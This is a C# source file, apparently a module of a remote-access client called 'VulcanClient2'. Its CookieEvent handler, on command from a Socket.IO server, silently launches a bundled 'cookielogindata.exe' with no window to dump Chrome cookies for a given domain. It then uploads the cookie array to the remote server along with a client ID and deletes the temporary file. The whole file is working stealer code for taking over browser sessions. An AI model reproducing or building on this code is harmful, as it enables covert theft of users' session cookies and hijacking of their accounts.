using System.Threading.Tasks;
using System.Text;
using SocketIOClient;
using System.Diagnostics;
using System.IO;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Serilog;
using System.Linq;

namespace VulcanClient2.Events
{
    public class CookieEvent : Event
    {
        public CookieEvent(SocketIO socket, string name) : base(socket, name) {}
        
        public override async Task Run(SocketIOResponse response)
        {
            Progress.Set("cookies", 20);
            string domain = response.GetValue(0).Value<string>("domain");
            string clientId = response.GetValue(0).Value<string>("clientId");
            var cookieProcess = new Process();
            string filename = $"{Directory.GetCurrentDirectory()}/addons/cookielogindata.exe";
            
            cookieProcess.StartInfo.FileName = filename;
            cookieProcess.StartInfo.Arguments = $"cookies chrome {domain}";
            cookieProcess.StartInfo.CreateNoWindow = true;
            cookieProcess.StartInfo.UseShellExecute = false;
            cookieProcess.StartInfo.RedirectStandardOutput = true;
            cookieProcess.StartInfo.RedirectStandardError = true;
            cookieProcess.StartInfo.StandardErrorEncoding = Encoding.UTF8;
            cookieProcess.StartInfo.StandardOutputEncoding = Encoding.UTF8;

            cookieProcess.Start();
            Progress.Set("cookies", 40);

            await cookieProcess.WaitForExitAsync();
            Progress.Set("cookies", 60);
            
            var reader = cookieProcess.StandardOutput;
            var errorReader = cookieProcess.StandardError;
            
            string output = reader.ReadToEnd();
            string error = errorReader.ReadToEnd();

            string endOutput = error != "" ? error : output;

            string clearOutput = string.Concat(endOutput.Where(c => !char.IsWhiteSpace(c)));
            string fullPath = Path.GetFullPath(clearOutput);

            var jsonCookiesArray = JArray.Parse(File.ReadAllText(fullPath));
            Progress.Set("cookies", 80);
            
            await Socket.EmitAsync("cookies", new
            {
                cookies = jsonCookiesArray,
                clientId = clientId
            });
            Progress.Set("cookies", 90);

            await Task.Run(() =>
            {
                File.Delete(fullPath);
                Progress.Set("cookies", 100);
            });
        }
    }
}